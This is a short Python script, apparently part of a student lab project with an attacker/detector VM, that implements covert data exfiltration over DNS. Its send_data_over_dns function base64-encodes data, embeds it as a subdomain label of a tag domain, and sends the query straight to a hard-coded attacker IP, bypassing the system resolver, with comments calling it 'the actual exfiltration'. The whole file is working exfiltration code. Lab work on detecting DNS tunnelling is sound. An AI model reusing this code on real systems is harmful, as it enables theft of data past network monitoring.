import base64
import dns.resolver

# --- CONFIGURATION ---
# The IP address of your Attacker/Detector VM (Kali-FYP1)
ATTACKER_IP = "10.0.0.5"            
# The fake domain used to tag the traffic (Must match attacker_receiver.py)
ATTACKER_DOMAIN = "test.google.com" 

def send_data_over_dns(data):
    try:
        # 1. Encode the data to Base64 (URL-safe)
        # We strip the '=' padding because '=' is not a valid character in DNS labels.
        encoded_data = base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

        # 2. Construct the target domain: <stolen_data>.test.google.com
        target_domain = f"{encoded_data}.{ATTACKER_DOMAIN}"

        print(f"[>] Sending Covert DNS to {ATTACKER_IP}: {target_domain}")

        # 3. Configure the Resolver to target the Attacker DIRECTLY
        resolver = dns.resolver.Resolver()
        
        # [CRITICAL STEP] 
        # This tells the script: "Do NOT use the system DNS. Send this packet ONLY to 10.0.0.5"
        resolver.nameservers = [ATTACKER_IP] 
        
        resolver.lifetime = 1 # 1 second timeout (we don't wait long for a reply)
        resolver.timeout = 1

        # 4. Send the DNS Query (The actual exfiltration)
        # The Attacker (10.0.0.5) will sniff this packet off the wire.
        resolver.resolve(target_domain, "A")

    except Exception:
        # We expect a timeout exception here because 10.0.0.5 is not a real DNS server 
        # and won't send a valid reply back. This is normal behavior for this attack.
        pass
